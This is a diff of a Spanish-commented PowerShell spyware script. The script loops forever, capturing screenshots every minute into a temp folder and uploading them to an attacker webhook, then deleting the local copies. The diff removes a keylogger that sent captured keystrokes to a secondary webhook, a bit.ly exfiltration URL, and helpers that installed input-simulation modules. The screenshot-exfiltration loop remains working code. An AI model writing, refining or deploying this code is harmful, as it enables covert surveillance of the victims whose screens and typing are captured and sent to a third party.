@@ -11,36 +11,6 @@ function SendErrorLogToSecondaryWebhook {
     }
 }
 
-# Función para instalar el proveedor NuGet si no está instalado
-function InstallNuGetProvider {
-    if (-not (Get-PackageProvider -Name NuGet -ErrorAction SilentlyContinue)) {
-        try {
-            Write-Host "Instalando el proveedor NuGet..."
-            Install-PackageProvider -Name NuGet -Force -ErrorAction Stop
-            return $true
-        } catch {
-            SendErrorLogToSecondaryWebhook -errorMessage "Error al instalar el proveedor NuGet: $_"
-            return $false
-        }
-    }
-    return $true
-}
-
-# Función para instalar el módulo InputSimulator si no está instalado
-function InstallInputSimulatorModule {
-    if (-not (Get-Module -Name "InputSimulator" -ListAvailable)) {
-        try {
-            Write-Host "Instalando el módulo InputSimulator..."
-            Install-Module -Name "InputSimulator" -Scope CurrentUser -Force -ErrorAction Stop
-            return $true
-        } catch {
-            SendErrorLogToSecondaryWebhook -errorMessage "Error al instalar el módulo InputSimulator: $_"
-            return $false
-        }
-    }
-    return $true
-}
-
 # Función para crear la carpeta temporal si no existe
 function CreateTempFolder {
     $TempFolder = "$env:temp\sysw"
@@ -48,33 +18,12 @@ function CreateTempFolder {
         try {
             Write-Host "Creando carpeta temporal..."
             New-Item -ItemType Directory -Path $TempFolder -ErrorAction Stop | Out-Null
-            return $true
         } catch {
             SendErrorLogToSecondaryWebhook -errorMessage "Error al crear la carpeta temporal: $_"
             return $false
         }
     }
     return $true
-}
-
-# Función para capturar pulsaciones del teclado y enviarlas al webhook secundario
-function CaptureAndSendKeystrokes {
-    try {
-        $keystrokes = @()
-        
-        # Captura las pulsaciones del teclado durante 30 segundos
-        $endTime = (Get-Date).AddSeconds(30)
-        while ((Get-Date) -lt $endTime) {
-            $key = [Console]::ReadKey($true)
-            $keystrokes += $key.KeyChar
-        }
-        
-        # Convierte las pulsaciones del teclado en una cadena y envíalas al webhook secundario
-        $keystrokesString = $keystrokes -join ""
-        Invoke-WebRequest -Uri $secondaryHookUrl -Method Post -Body "{""keystrokes"":""$keystrokesString""}" -ContentType "application/json" -ErrorAction Stop
-    } catch {
-        SendErrorLogToSecondaryWebhook -errorMessage "Error al capturar y enviar pulsaciones del teclado: $_"
-    }
 }
 
 # Función para tomar una captura de pantalla
@@ -96,17 +45,14 @@ function TakeScreenshot {
     }
 }
 
-# Define la URL del webhook principal
-$hookurl = "https://bit.ly/web_chupakbras"
+# Configuración inicial
+$Width = $Height = $Left = $Top = $counter = 0
 
-# Define el intervalo de tiempo en segundos entre capturas de pantalla
-$seconds = 60 # Intervalo de captura de pantalla (1 minuto)
-
-# Define el rango de tiempo en segundos para enviar las imágenes
-$sendInterval = 300 # 5 minutos
-
-# Variable para contar las capturas
-$counter = 0
+# Ejecuta la función para crear la carpeta temporal
+if (!(CreateTempFolder)) {
+    Write-Host "No se pudo crear la carpeta temporal."
+    exit
+}
 
 # Obtiene la resolución de la pantalla
 try {
@@ -120,23 +66,17 @@ try {
     exit
 }
 
-# Ejecuta las funciones de configuración
-if (!(InstallNuGetProvider) -or !(InstallInputSimulatorModule) -or !(CreateTempFolder)) {
-    SendErrorLogToSecondaryWebhook -errorMessage "No se pudo completar la configuración inicial."
-    exit
-}
-
-# Realiza la captura de pantalla y envía las capturas
+# Ejecución principal
 while ($true) {
     # Realiza la captura de pantalla
     TakeScreenshot
 
-    # Si se alcanza el tiempo para enviar las imágenes, envía todas las capturas
-    if ($counter -gt 0 -and $counter % ($sendInterval / $seconds) -eq 0) {
+    # Si se ha tomado una captura de pantalla, envía el archivo
+    if ($counter -gt 0) {
         try {
             Write-Host "Enviando imágenes..."
             Get-ChildItem -Path $TempFolder -Filter "*.png" | ForEach-Object {
-                Invoke-WebRequest -Uri $hookurl -Method Post -InFile $_.FullName -ErrorAction Stop
+                Invoke-WebRequest -Uri $mainWebhookUrl -Method Post -InFile $_.FullName -ErrorAction Stop
                 Remove-Item -Path $_.FullName -Force
             }
             $counter = 0
@@ -145,9 +85,7 @@ while ($true) {
         }
     }
 
-    # Captura pulsaciones del teclado cada 30 segundos y envíalas al webhook secundario
-    CaptureAndSendKeystrokes
-
-    # Espera el tiempo definido antes de tomar la próxima captura
-    Start-Sleep -Seconds $seconds
+    # Espera antes de tomar la próxima captura de pantalla
+    Start-Sleep -Seconds 60  # Espera 60 segundos (1 minuto) antes de tomar la próxima captura
 }
+
